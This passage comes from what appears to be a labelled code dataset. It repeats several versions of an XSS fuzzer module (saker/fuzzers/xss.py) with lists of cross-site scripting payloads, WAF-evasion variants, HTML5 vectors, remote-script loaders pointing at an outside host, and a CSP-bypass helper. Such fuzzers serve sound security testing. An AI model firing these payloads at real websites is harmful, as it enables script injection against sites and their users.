p=False):\n        return \"<script>alert(/xss/)</script>\"\n\n    @classmethod\n    def genTestHTML(cls):\n        s = ''\n        for t in cls.tags:\n            s += '<%s src=\"x\"' % t\n            for e in cls.events:\n                s += ''' %s=\"console.log('%s %s')\" ''' % (e, t, e)\n            s += '>%s</%s>\\n' % (t, t)\n        return cls.htmlTemplate % s\n\n    @classmethod\n    def acmehttp01(cls, url):\n        # https://labs.detectify.com/2018/09/04/xss-using-quirky-implementations-of-acme-http-01/\n        return url + '/.well-known/acme-challenge/?<h1>hi'\n\n    def img(self, payload):\n        return '<img/onerror=\"%s\"/src=x>' % payload\n\n    def svg(self, payload):\n        return '<svg/onload=\"%s\"/>' % payload\n\n    def style(self, payload):\n        return '<style/onload=\"%s\"></style>' % payload\n\n    def input(self, payload):\n        return '<input/onfocus=\"%s\"/autofocus>' % payload\n\n    def marquee(self, payload):\n        return '<marquee/onstart=\"%s\"></marquee>' % payload\n\n    def div(self, payload):\n        return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload\n\n    def script(self):\n        payload = \"<script src='%s'></script>\" % self.url\n        return payload\n\n    def event(self, element, src, event, js):\n        payload = \"<%s src=\" % element\n        payload += '\"%s\" ' % src\n        payload += event\n        payload += \"=%s >\" % js\n        return payload\n\n    def cspBypass(self):\n        return \"<link rel='preload' href='%s'>\" % self.url\n/n/n/n", "label": 0}, {"id": "9d984e18d74febb18c47c74a2e0ad9fe6efc0478", "code": "/saker/fuzzers/xss.py/n/n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom saker.fuzzers.fuzzer import Fuzzer\n\n_tags = [\n    'a',\n    'abbr',\n    'acronym',\n    'address',\n    'applet',\n    'area',\n    'article',\n    'aside',\n    'audio',\n    'b',\n    'base',\n    'basefont',\n    'bdi',\n    'bdo',\n    'bgsound',\n    'big',\n    'blink',\n    'blockquote',\n    'body',\n    'br',\n    'button',\n    'canvas',\n    'caption',\n    'center',\n    'cite',\n    'code',\n    'col',\n    'colgroup',\n    'command',\n    'content',\n    'data',\n    'datalist',\n    'dd',\n    'del',\n    'details',\n    'dfn',\n    'dialog',\n    'dir',\n    'div',\n    'dl',\n    'dt',\n    'element',\n    'em',\n    'embed',\n    'fieldset',\n    'figcaption',\n    'figure',\n    'font',\n    'footer',\n    'form',\n    'frame',\n    'frameset',\n    'h1',\n    'h2',\n    'h3',\n    'h4',\n    'h5',\n    'h6',\n    'head',\n    'header',\n    'hgroup',\n    'hr',\n    'html',\n    'i',\n    'iframe',\n    'image',\n    'img',\n    'input',\n    'ins',\n    'isindex',\n    'kbd',\n    'keygen',\n    'label',\n    'layer',\n    'legend',\n    'li',\n    'link',\n    'listing',\n    'main',\n    'map',\n    'mark',\n    'marquee',\n    'menu',\n    'menuitem',\n    'meta',\n    'meter',\n    'multicol',\n    'nav',\n    'nobr',\n    'noembed',\n    'noframes',\n    'nolayer',\n    'noscript',\n    'object',\n    'ol',\n    'optgroup',\n    'option',\n    'output',\n    'p',\n    'param',\n    'picture',\n    # 'plaintext',\n    'pre',\n    'progress',\n    'q',\n    'rp',\n    'rt',\n    'rtc',\n    'ruby',\n    's',\n    'samp',\n    'script',\n    'section',\n    'select',\n    'shadow',\n    'small',\n    'source',\n    'spacer',\n    'span',\n    'strike',\n    'strong',\n    'style',\n    'sub',\n    'summary',\n    'sup',\n    'table',\n    'tbody',\n    'td',\n    'template',\n    'textarea',\n    'tfoot',\n    'th',\n    'thead',\n    'time',\n    'title',\n    'tr',\n    'track',\n    'tt',\n    'u',\n    'ul',\n    'var',\n    'video',\n    'wbr',\n    'xmp',\n]\n\n_events = [\n    'onabort',\n    'onautocomplete',\n    'onautocompleteerror',\n    'onafterscriptexecute',\n    'onanimationend',\n    'onanimationiteration',\n    'onanimationstart',\n    'onbeforecopy',\n    'onbeforecut',\n    'onbeforeload',\n    'onbeforepaste',\n    'onbeforescriptexecute',\n    'onbeforeunload',\n    'onbegin',\n    'onblur',\n    'oncanplay',\n    'oncanplaythrough',\n    'onchange',\n    'onclick',\n    'oncontextmenu',\n    'oncopy',\n    'oncut',\n    'ondblclick',\n    'ondrag',\n    'ondragend',\n    'ondragenter',\n    'ondragleave',\n    'ondragover',\n    'ondragstart',\n    'ondrop',\n    'ondurationchange',\n    'onend',\n    'onemptied',\n    'onended',\n    'onerror',\n    'onfocus',\n    'onfocusin',\n    'onfocusout',\n    'onhashchange',\n    'oninput',\n    'oninvalid',\n    'onkeydown',\n    'onkeypress',\n    'onkeyup',\n    'onload',\n    'onloadeddata',\n    'onloadedmetadata',\n    'onloadstart',\n    'onmessage',\n    'onmousedown',\n    'onmouseenter',\n    'onmouseleave',\n    'onmousemove',\n    'onmouseout',\n    'onmouseover',\n    'onmouseup',\n    'onmousewheel',\n    'onoffline',\n    'ononline',\n    'onorientationchange',\n    'onpagehide',\n    'onpageshow',\n    'onpaste',\n    'onpause',\n    'onplay',\n    'onplaying',\n    'onpopstate',\n    'onprogress',\n    'onratechange',\n    'onreset',\n    'onresize',\n    'onscroll',\n    'onsearch',\n    'onseeked',\n    'onseeking',\n    'onselect',\n    'onselectionchange',\n    'onselectstart',\n    'onstalled',\n    'onstorage',\n    'onsubmit',\n    'onsuspend',\n    'ontimeupdate',\n    'ontoggle',\n    'ontouchcancel',\n    'ontouchend',\n    'ontouchmove',\n    'ontouchstart',\n    'ontransitionend',\n    'onunload',\n    'onvolumechange',\n    'onwaiting',\n    'onwebkitanimationend',\n    'onwebkitanimationiteration',\n    'onwebkitanimationstart',\n    'onwebkitfullscreenchange',\n    'onwebkitfullscreenerror',\n    'onwebkitkeyadded',\n    'onwebkitkeyerror',\n    'onwebkitkeymessage',\n    'onwebkitneedkey',\n    'onwebkitsourceclose',\n    'onwebkitsourceended',\n    'onwebkitsourceopen',\n    'onwebkitspeechchange',\n    'onwebkittransitionend',\n    'onwheel'\n]\n\n_htmlTemplate = '''\n<!DOCTYPE html>\n<html>\n<head>\n    <title>XSS Fuzzer</title>\n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n</head>\n<body>\n%s\n</body>\n</html>\n'''\n\n# probe for test xss vuln\n_probes = [\n    \"\"\"'';!--\"<XSS>=&{()}\"\"\",\n]\n\n# xss payloads\n_payloads = [\n    '<q/oncut=open()>',\n    '<svg/onload=eval(name)>',\n    '<img src=x onerror=alert(/xss/)>',\n    \"\"\"<img src=\"javascript:alert('xss');\">\"\"\",\n    \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\"xss\")';</style>\"\"\",\n    \"\"\"<img style=\"xss:expr/*xss*/ession(alert('xss'))\"> \"\"\",\n    \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('xss');\">\"\"\",\n    \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\",\n    \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\",\n]\n\n# payload for waf test\n_waf_payloads = [\n    \"<IMG SRC=JaVaScRiPt:alert('xss')>\",\n    '<<script>alert(\"xss\");//<</script>',\n    \"\"\"<img src=\"javascript:alert('xss')\" \"\"\",\n    '<a href=\"javascript%26colon;alert(1)\">click',\n    '<a href=javas&#99;ript:alert(1)>click',\n    '<--`<img/src=` onerror=confirm``> --!>',\n    '\\'\"</Script><Html Onmouseover=(confirm)()//'\n    '<imG/sRc=l oNerrOr=(prompt)() x>',\n    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',\n    '<deTails open oNToggle=confi\\u0072m()>',\n    '<img sRc=l oNerrOr=(confirm)() x>',\n    '<svg/x=\">\"/onload=confirm()//',\n    '<svg%0Aonload=%09((pro\\u006dpt))()//',\n    '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>',\n    '<sCript x>confirm``</scRipt x>',\n    '<Script x>prompt()</scRiPt x>',\n    '<sCriPt sRc=//t.cn>',\n    '<embed//sRc=//t.cn>',\n    '<base href=//t.cn/><script src=/>',\n    '<object//data=//t.cn>',\n    '<s=\" onclick=confirm``>clickme',\n    '<svG oNLoad=co\\u006efirm&#x28;1&#x29>',\n    '\\'\"><y///oNMousEDown=((confirm))()>Click',\n    '<a/href=javascript&colon;co\\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',\n    '<img src=x onerror=confir\\u006d`1`>',\n    '<svg/onload=co\\u006efir\\u006d`1`>',\n    '<?xml version=\"1.0\"?><html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script></html>'\n]\n\n# payload with html 5 features\n# http://html5sec.org\n_h5payloads = [\n    '<form id=\"test\"></form><button form=\"test\" formaction=\"javascript:alert(1)\">X</button>',\n    '<input onfocus=alert(1) autofocus>',\n    '<input onblur=alert(1) autofocus><input autofocus>',\n    '<body onscroll=alert(1)>' + '<br>' * 100 + '<input autofocus>',\n    '<video><source onerror=\"alert(1)\">',\n    '<video onerror=\"alert(1)\"><source></source></video>',\n    '<form><button formaction=\"javascript:alert(1)\">X</button>',\n    '<math href=\"javascript:alert(1)\">CLICKME</math>',\n    '<link rel=\"import\" href=\"test.svg\" />',\n    '<iframe srcdoc=\"&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;\" />',\n]\n\n\nclass XSS(Fuzzer):\n\n    \"\"\"generate XSS payload\"\"\"\n\n    tags = _tags\n    events = _events\n    htmlTemplate = _htmlTemplate\n    probes = _probes\n    payloads = _payloads\n    waf_payloads = _waf_payloads\n    h5payloads = _h5payloads\n\n    def __init__(self, url=\"\"):\n        \"\"\"\n        url: xss payload url\n        \"\"\"\n        super(XSS, self).__init__()\n        self.url = url\n\n    @classmethod\n    def alterTest(cls, p=False):\n        return \"<script>alert(/xss/)</script>\"\n\n    @classmethod\n    def genTestHTML(cls):\n        s = ''\n        for t in cls.tags:\n            s += '<%s src=\"x\"' % t\n            for e in cls.events:\n                s += ''' %s=\"console.log('%s %s')\" ''' % (e, t, e)\n            s += '>%s</%s>\\n' % (t, t)\n        return cls.htmlTemplate % s\n\n    @classmethod\n    def acmehttp01(cls, url):\n        # https://labs.detectify.com/2018/09/04/xss-using-quirky-implementations-of-acme-http-01/\n        return url + '/.well-known/acme-challenge/?<h1>hi'\n\n    def img(self, payload):\n        return '<img/onerror=\"%s\"/src=x>' % payload\n\n    def svg(self, payload):\n        return '<svg/onload=\"%s\"/>' % payload\n\n    def style(self, payload):\n        return '<style/onload=\"%s\"></style>' % payload\n\n    def input(self, payload):\n        return '<input/onfocus=\"%s\"/autofocus>' % payload\n\n    def marquee(self, payload):\n        return '<marquee/onstart=\"%s\"></marquee>' % payload\n\n    def div(self, payload):\n        return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload\n\n    def script(self):\n        payload = \"<script src='%s'></script>\" % self.url\n        return payload\n\n    def event(self, element, src, event, js):\n        payload = \"<%s src=\" % element\n        payload += '\"%s\" ' % src\n        payload += event\n        payload += \"=%s >\" % js\n        return payload\n\n    def cspBypass(self):\n        return \"<link rel='preload' href='%s'>\" % self.url\n/n/n/n", "label": 1}, {"id": "9d9faf7de059066aab203f069eade13e89a93b39", "code": "saker/fuzzers/xss.py/n/n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom saker.fuzzers.fuzzer import Fuzzer\n\n_tags = [\n    'a',\n    'abbr',\n    'acronym',\n    'address',\n    'applet',\n    'area',\n    'article',\n    'aside',\n    'audio',\n    'b',\n    'base',\n    'basefont',\n    'bdi',\n    'bdo',\n    'bgsound',\n    'big',\n    'blink',\n    'blockquote',\n    'body',\n    'br',\n    'button',\n    'canvas',\n    'caption',\n    'center',\n    'cite',\n    'code',\n    'col',\n    'colgroup',\n    'command',\n    'content',\n    'data',\n    'datalist',\n    'dd',\n    'del',\n    'details',\n    'dfn',\n    'dialog',\n    'dir',\n    'div',\n    'dl',\n    'dt',\n    'element',\n    'em',\n    'embed',\n    'fieldset',\n    'figcaption',\n    'figure',\n    'font',\n    'footer',\n    'form',\n    'frame',\n    'frameset',\n    'h1',\n    'h2',\n    'h3',\n    'h4',\n    'h5',\n    'h6',\n    'head',\n    'header',\n    'hgroup',\n    'hr',\n    'html',\n    'i',\n    'iframe',\n    'image',\n    'img',\n    'input',\n    'ins',\n    'isindex',\n    'kbd',\n    'keygen',\n    'label',\n    'layer',\n    'legend',\n    'li',\n    'link',\n    'listing',\n    'main',\n    'map',\n    'mark',\n    'marquee',\n    'menu',\n    'menuitem',\n    'meta',\n    'meter',\n    'multicol',\n    'nav',\n    'nobr',\n    'noembed',\n    'noframes',\n    'nolayer',\n    'noscript',\n    'object',\n    'ol',\n    'optgroup',\n    'option',\n    'output',\n    'p',\n    'param',\n    'picture',\n    # 'plaintext',\n    'pre',\n    'progress',\n    'q',\n    'rp',\n    'rt',\n    'rtc',\n    'ruby',\n    's',\n    'samp',\n    'script',\n    'section',\n    'select',\n    'shadow',\n    'small',\n    'source',\n    'spacer',\n    'span',\n    'strike',\n    'strong',\n    'style',\n    'sub',\n    'summary',\n    'sup',\n    'table',\n    'tbody',\n    'td',\n    'template',\n    'textarea',\n    'tfoot',\n    'th',\n    'thead',\n    'time',\n    'title',\n    'tr',\n    'track',\n    'tt',\n    'u',\n    'ul',\n    'var',\n    'video',\n    'wbr',\n    'xmp',\n]\n\n_events = [\n    'onabort',\n    'onautocomplete',\n    'onautocompleteerror',\n    'onafterscriptexecute',\n    'onanimationend',\n    'onanimationiteration',\n    'onanimationstart',\n    'onbeforecopy',\n    'onbeforecut',\n    'onbeforeload',\n    'onbeforepaste',\n    'onbeforescriptexecute',\n    'onbeforeunload',\n    'onbegin',\n    'onblur',\n    'oncanplay',\n    'oncanplaythrough',\n    'onchange',\n    'onclick',\n    'oncontextmenu',\n    'oncopy',\n    'oncut',\n    'ondblclick',\n    'ondrag',\n    'ondragend',\n    'ondragenter',\n    'ondragleave',\n    'ondragover',\n    'ondragstart',\n    'ondrop',\n    'ondurationchange',\n    'onend',\n    'onemptied',\n    'onended',\n    'onerror',\n    'onfocus',\n    'onfocusin',\n    'onfocusout',\n    'onhashchange',\n    'oninput',\n    'oninvalid',\n    'onkeydown',\n    'onkeypress',\n    'onkeyup',\n    'onload',\n    'onloadeddata',\n    'onloadedmetadata',\n    'onloadstart',\n    'onmessage',\n    'onmousedown',\n    'onmouseenter',\n    'onmouseleave',\n    'onmousemove',\n    'onmouseout',\n    'onmouseover',\n    'onmouseup',\n    'onmousewheel',\n    'onoffline',\n    'ononline',\n    'onorientationchange',\n    'onpagehide',\n    'onpageshow',\n    'onpaste',\n    'onpause',\n    'onplay',\n    'onplaying',\n    'onpopstate',\n    'onprogress',\n    'onratechange',\n    'onreset',\n    'onresize',\n    'onscroll',\n    'onsearch',\n    'onseeked',\n    'onseeking',\n    'onselect',\n    'onselectionchange',\n    'onselectstart',\n    'onstalled',\n    'onstorage',\n    'onsubmit',\n    'onsuspend',\n    'ontimeupdate',\n    'ontoggle',\n    'ontouchcancel',\n    'ontouchend',\n    'ontouchmove',\n    'ontouchstart',\n    'ontransitionend',\n    'onunload',\n    'onvolumechange',\n    'onwaiting',\n    'onwebkitanimationend',\n    'onwebkitanimationiteration',\n    'onwebkitanimationstart',\n    'onwebkitfullscreenchange',\n    'onwebkitfullscreenerror',\n    'onwebkitkeyadded',\n    'onwebkitkeyerror',\n    'onwebkitkeymessage',\n    'onwebkitneedkey',\n    'onwebkitsourceclose',\n    'onwebkitsourceended',\n    'onwebkitsourceopen',\n    'onwebkitspeechchange',\n    'onwebkittransitionend',\n    'onwheel'\n]\n\n_htmlTemplate = '''\n<!DOCTYPE html>\n<html>\n<head>\n    <title>XSS Fuzzer</title>\n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n</head>\n<body>\n%s\n</body>\n</html>\n'''\n\n# probe for test xss vuln\n_probes = [\n    \"\"\"'';!--\"<XSS>=&{()}\"\"\",\n]\n\n# xss payloads\n_payloads = [\n    '<q/oncut=open()>',\n    '<svg/onload=eval(name)>',\n    '<svg/onload=eval(window.name)>',\n    '<svg/onload=eval(location.hash.slice(1))>',\n    '<img src=x onerror=alert(/xss/)>',\n    \"\"\"<img src=\"javascript:alert('xss');\">\"\"\",\n    \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\"xss\")';</style>\"\"\",\n    \"\"\"<img style=\"xss:expr/*xss*/ession(alert('xss'))\"> \"\"\",\n    \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('xss');\">\"\"\",\n    \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\",\n    \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\"\n]\n\n# reg test payloads\n_reg_payloads = [\n    # no reg\n    \"<svg\",\n    # <[a-z]+\n    \"<dev\",\n    # ^<[a-z]+\n    \"x<dev\",\n    # <[a-zA-Z]+\n    \"<dEv\",\n    # <[a-zA-Z0-9]+\n    \"<d3V\",\n    # <.+\n    \"<d|3v \",\n]\n\n# payload for waf test\n_waf_payloads = [\n    \"<IMG SRC=JaVaScRiPt:alert('xss')>\",\n    '<<script>alert(\"xss\");//<</script>',\n    \"\"\"<img src=\"javascript:alert('xss')\" \"\"\",\n    '<a href=\"javascript%26colon;alert(1)\">click',\n    '<a href=javas&#99;ript:alert(1)>click',\n    '<--`<img/src=` onerror=confirm``> --!>',\n    '\\'\"</Script><Html Onmouseover=(confirm)()//'\n    '<imG/sRc=l oNerrOr=(prompt)() x>',\n    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',\n    '<deTails open oNToggle=confi\\u0072m()>',\n    '<img sRc=l oNerrOr=(confirm)() x>',\n    '<svg/x=\">\"/onload=confirm()//',\n    '<svg%0Aonload=%09((pro\\u006dpt))()//',\n    '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>',\n    '<sCript x>confirm``</scRipt x>',\n    '<Script x>prompt()</scRiPt x>',\n    '<sCriPt sRc=//t.cn>',\n    '<embed//sRc=//t.cn>',\n    '<base href=//t.cn/><script src=/>',\n    '<object//data=//t.cn>',\n    '<s=\" onclick=confirm``>clickme',\n    '<svG oNLoad=co\\u006efirm&#x28;1&#x29>',\n    '\\'\"><y///oNMousEDown=((confirm))()>Click',\n    '<a/href=javascript&colon;co\\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',\n    '<img src=x onerror=confir\\u006d`1`>',\n    '<svg/onload=co\\u006efir\\u006d`1`>',\n    '<?xml version=\"1.0\"?><html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script></html>',\n    '<scriscriptpt>alert(/xss/)</scriscriptpt>',\n    '\u00bcscript\u00bealert(\u00a2XSS\u00a2)\u00bc/script\u00be',\n    '<a\"/onclick=(confirm)()>click',\n    '<a/href=javascript&colon;alert()>click',\n    '<a/href=&#74;ava%0a%0d%09script&colon;alert()>click',\n    '<d3v/onauxclick=[2].some(confirm)>click',\n    '<d3v/onauxclick=(((confirm)))\">click',\n    '<d3v/onmouseleave=[2].some(confirm)>click',\n    '<details/open/ontoggle=alert()>',\n    '<details/open/ontoggle=(confirm)()//'\n]\n\n# payload with html 5 features\n# http://html5sec.org\n_h5payloads = [\n    '<form id=\"test\"></form><button form=\"test\" formaction=\"javascript:alert(1)\">X</button>',\n    '<input onfocus=alert(1) autofocus>',\n    '<input onblur=alert(1) autofocus><input autofocus>',\n    '<body onscroll=alert(1)>' + '<br>' * 100 + '<input autofocus>',\n    '<video><source onerror=\"alert(1)\">',\n    '<video onerror=\"alert(1)\"><source></source></video>',\n    '<form><button formaction=\"javascript:alert(1)\">X</button>',\n    '<math href=\"javascript:alert(1)\">CLICKME</math>',\n    '<link rel=\"import\" href=\"test.svg\" />',\n    '<iframe srcdoc=\"&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;\" />',\n]\n\n\nclass XSS(Fuzzer):\n\n    \"\"\"generate XSS payload\"\"\"\n\n    tags = _tags\n    events = _events\n    htmlTemplate = _htmlTemplate\n    probes = _probes\n    payloads = _payloads\n    reg_payloads = _reg_payloads\n    waf_payloads = _waf_payloads\n    h5payloads = _h5payloads\n\n    def __init__(self, url=\"\"):\n        \"\"\"\n        url: xss payload url\n        \"\"\"\n        super(XSS, self).__init__()\n        self.url = url\n\n    @classmethod\n    def alterTest(cls, p=False):\n        return \"<script>alert(/xss/)</script>\"\n\n    @classmethod\n    def genTestHTML(cls):\n        s = ''\n        for t in cls.tags:\n            s += '<%s src=\"x\"' % t\n            for e in cls.events:\n                s += ''' %s=\"console.log('%s %s')\" ''' % (e, t, e)\n            s += '>%s</%s>\\n' % (t, t)\n        return cls.htmlTemplate % s\n\n    @classmethod\n    def acmehttp01(cls, url):\n        # https://labs.detectify.com/2018/09/04/xss-using-quirky-implementations-of-acme-http-01/\n        return url + '/.well-known/acme-challenge/?<h1>hi'\n\n    @classmethod\n    def img(cls, payload):\n        return '<img/onerror=\"%s\"/src=x>' % payload\n\n    @classmethod\n    def svg(cls, payload):\n        return '<svg/onload=\"%s\"/>' % payload\n\n    @classmethod\n    def style(cls, payload):\n        return '<style/onload=\"%s\"></style>' % payload\n\n    @classmethod\n    def input(cls, payload):\n        return '<input/onfocus=\"%s\"/autofocus>' % payload\n\n    @classmethod\n    def marquee(cls, payload):\n        return '<marquee/onstart=\"%s\"></marquee>' % payload\n\n    @classmethod\n    def div(cls, payload):\n        return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload\n\n    @classmethod\n    def template(cls, tag=\"img\", delimiter=\" \", event_handler=\"onerror\", javascript=\"alert(/xss/)\", ending=\">\"):\n        '''\n        delimiter \" \"\n        delimiter \"\\x09\"\n        delimiter \"\\x09\\x09\"\n        delimiter \"/\"\n        delimiter \"\\x0a\"\n        delimiter \"\\x0d\"\n        delimiter \"/~/\"\n        ending \">\"\n        ending \"//\"\n        ending \" \"\n        ending \"\\t\"\n        ending \"\\n\"\n        '''\n        return f\"<{tag}{delimiter}{event_handler}={javascript}{delimiter}{ending}\"\n\n    def script(self):\n        payload = \"<script src='%s'></script>\" % self.url\n        return payload\n\n    def event(self, element, src, event, js):\n        payload = \"<%s src=\" % element\n        payload += '\"%s\" ' % src\n        payload += event\n        payload += \"=%s >\" % js\n        return payload\n\n    def cspBypass(self):\n        return \"<link rel='preload' href='%s'>\" % self.url\n/n/n/n", "label": 0}, {"id": "9d9faf7de059066aab203f069eade13e89a93b39", "code": "/saker/fuzzers/xss.py/n/n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom saker.fuzzers.fuzzer import Fuzzer\n\n_tags = [\n    'a',\n    'abbr',\n    'acronym',\n    'address',\n    'applet',\n    'area',\n    'article',\n    'aside',\n    'audio',\n    'b',\n    'base',\n    'basefont',\n    'bdi',\n    'bdo',\n    'bgsound',\n    'big',\n    'blink',\n    'blockquote',\n    'body',\n    'br',\n    'button',\n    'canvas',\n    'caption',\n    'center',\n    'cite',\n    'code',\n    'col',\n    'colgroup',\n    'command',\n    'content',\n    'data',\n    'datalist',\n    'dd',\n    'del',\n    'details',\n    'dfn',\n    'dialog',\n    'dir',\n    'div',\n    'dl',\n    'dt',\n    'element',\n    'em',\n    'embed',\n    'fieldset',\n    'figcaption',\n    'figure',\n    'font',\n    'footer',\n    'form',\n    'frame',\n    'frameset',\n    'h1',\n    'h2',\n    'h3',\n    'h4',\n    'h5',\n    'h6',\n    'head',\n    'header',\n    'hgroup',\n    'hr',\n    'html',\n    'i',\n    'iframe',\n    'image',\n    'img',\n    'input',\n    'ins',\n    'isindex',\n    'kbd',\n    'keygen',\n    'label',\n    'layer',\n    'legend',\n    'li',\n    'link',\n    'listing',\n    'main',\n    'map',\n    'mark',\n    'marquee',\n    'menu',\n    'menuitem',\n    'meta',\n    'meter',\n    'multicol',\n    'nav',\n    'nobr',\n    'noembed',\n    'noframes',\n    'nolayer',\n    'noscript',\n    'object',\n    'ol',\n    'optgroup',\n    'option',\n    'output',\n    'p',\n    'param',\n    'picture',\n    # 'plaintext',\n    'pre',\n    'progress',\n    'q',\n    'rp',\n    'rt',\n    'rtc',\n    'ruby',\n    's',\n    'samp',\n    'script',\n    'section',\n    'select',\n    'shadow',\n    'small',\n    'source',\n    'spacer',\n    'span',\n    'strike',\n    'strong',\n    'style',\n    'sub',\n    'summary',\n    'sup',\n    'table',\n    'tbody',\n    'td',\n    'template',\n    'textarea',\n    'tfoot',\n    'th',\n    'thead',\n    'time',\n    'title',\n    'tr',\n    'track',\n    'tt',\n    'u',\n    'ul',\n    'var',\n    'video',\n    'wbr',\n    'xmp',\n]\n\n_events = [\n    'onabort',\n    'onautocomplete',\n    'onautocompleteerror',\n    'onafterscriptexecute',\n    'onanimationend',\n    'onanimationiteration',\n    'onanimationstart',\n    'onbeforecopy',\n    'onbeforecut',\n    'onbeforeload',\n    'onbeforepaste',\n    'onbeforescriptexecute',\n    'onbeforeunload',\n    'onbegin',\n    'onblur',\n    'oncanplay',\n    'oncanplaythrough',\n    'onchange',\n    'onclick',\n    'oncontextmenu',\n    'oncopy',\n    'oncut',\n    'ondblclick',\n    'ondrag',\n    'ondragend',\n    'ondragenter',\n    'ondragleave',\n    'ondragover',\n    'ondragstart',\n    'ondrop',\n    'ondurationchange',\n    'onend',\n    'onemptied',\n    'onended',\n    'onerror',\n    'onfocus',\n    'onfocusin',\n    'onfocusout',\n    'onhashchange',\n    'oninput',\n    'oninvalid',\n    'onkeydown',\n    'onkeypress',\n    'onkeyup',\n    'onload',\n    'onloadeddata',\n    'onloadedmetadata',\n    'onloadstart',\n    'onmessage',\n    'onmousedown',\n    'onmouseenter',\n    'onmouseleave',\n    'onmousemove',\n    'onmouseout',\n    'onmouseover',\n    'onmouseup',\n    'onmousewheel',\n    'onoffline',\n    'ononline',\n    'onorientationchange',\n    'onpagehide',\n    'onpageshow',\n    'onpaste',\n    'onpause',\n    'onplay',\n    'onplaying',\n    'onpopstate',\n    'onprogress',\n    'onratechange',\n    'onreset',\n    'onresize',\n    'onscroll',\n    'onsearch',\n    'onseeked',\n    'onseeking',\n    'onselect',\n    'onselectionchange',\n    'onselectstart',\n    'onstalled',\n    'onstorage',\n    'onsubmit',\n    'onsuspend',\n    'ontimeupdate',\n    'ontoggle',\n    'ontouchcancel',\n    'ontouchend',\n    'ontouchmove',\n    'ontouchstart',\n    'ontransitionend',\n    'onunload',\n    'onvolumechange',\n    'onwaiting',\n    'onwebkitanimationend',\n    'onwebkitanimationiteration',\n    'onwebkitanimationstart',\n    'onwebkitfullscreenchange',\n    'onwebkitfullscreenerror',\n    'onwebkitkeyadded',\n    'onwebkitkeyerror',\n    'onwebkitkeymessage',\n    'onwebkitneedkey',\n    'onwebkitsourceclose',\n    'onwebkitsourceended',\n    'onwebkitsourceopen',\n    'onwebkitspeechchange',\n    'onwebkittransitionend',\n    'onwheel'\n]\n\n_htmlTemplate = '''\n<!DOCTYPE html>\n<html>\n<head>\n    <title>XSS Fuzzer</title>\n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n</head>\n<body>\n%s\n</body>\n</html>\n'''\n\n# probe for test xss vuln\n_probes = [\n    \"\"\"'';!--\"<XSS>=&{()}\"\"\",\n]\n\n# xss payloads\n_payloads = [\n    '<q/oncut=open()>',\n    '<svg/onload=eval(name)>',\n    '<svg/onload=eval(window.name)>',\n    '<svg/onload=eval(location.hash.slice(1))>',\n    '<img src=x onerror=alert(/xss/)>',\n    \"\"\"<img src=\"javascript:alert('xss');\">\"\"\",\n    \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\"xss\")';</style>\"\"\",\n    \"\"\"<img style=\"xss:expr/*xss*/ession(alert('xss'))\"> \"\"\",\n    \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('xss');\">\"\"\",\n    \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\",\n    \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\"\n]\n\n# payload for waf test\n_waf_payloads = [\n    \"<IMG SRC=JaVaScRiPt:alert('xss')>\",\n    '<<script>alert(\"xss\");//<</script>',\n    \"\"\"<img src=\"javascript:alert('xss')\" \"\"\",\n    '<a href=\"javascript%26colon;alert(1)\">click',\n    '<a href=javas&#99;ript:alert(1)>click',\n    '<--`<img/src=` onerror=confirm``> --!>',\n    '\\'\"</Script><Html Onmouseover=(confirm)()//'\n    '<imG/sRc=l oNerrOr=(prompt)() x>',\n    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',\n    '<deTails open oNToggle=confi\\u0072m()>',\n    '<img sRc=l oNerrOr=(confirm)() x>',\n    '<svg/x=\">\"/onload=confirm()//',\n    '<svg%0Aonload=%09((pro\\u006dpt))()//',\n    '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>',\n    '<sCript x>confirm``</scRipt x>',\n    '<Script x>prompt()</scRiPt x>',\n    '<sCriPt sRc=//t.cn>',\n    '<embed//sRc=//t.cn>',\n    '<base href=//t.cn/><script src=/>',\n    '<object//data=//t.cn>',\n    '<s=\" onclick=confirm``>clickme',\n    '<svG 